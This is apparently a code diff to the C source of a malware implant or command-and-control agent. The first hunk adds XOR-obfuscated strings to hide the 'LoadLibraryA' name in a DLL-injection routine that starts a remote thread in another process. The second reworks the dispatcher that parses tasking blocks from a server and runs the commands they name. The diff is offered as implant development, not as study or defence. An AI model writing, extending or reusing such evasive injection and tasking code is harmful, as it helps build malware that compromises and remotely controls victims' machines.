@@ -441,8 +441,11 @@ VOID CommandInjectDLL(PTASK_PARSER Parser){
     UCHAR sK32[] = { 0xE4,0xEA,0xFD,0xE1,0xEA,0xE3,0xBC,0xBD,0xA1,0xEB,0xE3,0xE3,0x00 };
     for (int i = 0; i < 12; i++) sK32[i] ^= 0x8F;
 
+    UCHAR sLL[] = { 0xC3,0xE0,0xEE,0xEB,0xC3,0xE6,0xED,0xFD,0xEE,0xFD,0xF6,0xCE,0x00 };
+    for (int i = 0; i < 12; i++) sLL[i] ^= 0x8F;
+
     HMODULE hK32Remote = pGMH((LPCSTR)sK32);
-    FARPROC pLoadLib = pGPA(hK32Remote, "loadlibraryA");
+    FARPROC pLoadLib = pGPA(hK32Remote, (LPCSTR)sLL);
 
     HANDLE hThread = pRemote(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLib, pRemoteBuf, 0, NULL);
     if (!hThread) {
@@ -1018,30 +1021,37 @@ VOID CommandDispatcher(VOID){
         TASK_PARSER Parser = { 0 };
         TaskParserNew(&Parser, Data, Size, endian);
 
-        UINT32 first = TaskParserGetInt32(&Parser);
-        if (first == COMMAND_NO_JOB)
-            goto next;
-
         while (Parser.Length >= 4){
-            UINT32 cmd = TaskParserGetInt32(&Parser);
+            UINT32 block = TaskParserGetInt32(&Parser);
 
-            if (cmd == COMMAND_NO_JOB)
+            if (block == COMMAND_NO_JOB || block == 0 || block > Parser.Length)
                 break;
 
-            BOOL found = FALSE;
-            for (UINT32 i = 0; i < COMMAND_COUNT; i++){
-                if (CommandTable[i].ID == cmd){
-                    CommandTable[i].Function(&Parser);
-                    found = TRUE;
-                    break;
-                }
-            }
+            TASK_PARSER Task = { 0 };
+            TaskParserNew(&Task, Parser.Buffer, block, endian);
+            Parser.Buffer += block;
+            Parser.Length -= block;
 
-            if (!found)
-                printf("[dispatch] unknown cmd: 0x%x\n", cmd);
+            while (Task.Length >= 4){
+                UINT32 cmd = TaskParserGetInt32(&Task);
+
+                if (cmd == COMMAND_NO_JOB)
+                    break;
+
+                BOOL found = FALSE;
+                for (UINT32 i = 0; i < COMMAND_COUNT; i++){
+                    if (CommandTable[i].ID == cmd){
+                        CommandTable[i].Function(&Task);
+                        found = TRUE;
+                        break;
+                    }
+                }
+
+                if (!found)
+                    printf("[dispatch] unknown cmd: 0x%x\n", cmd);
+            }
         }
 
-next:
         if (Data){
             memset(Data, 0, Size);
             pFree(Data);
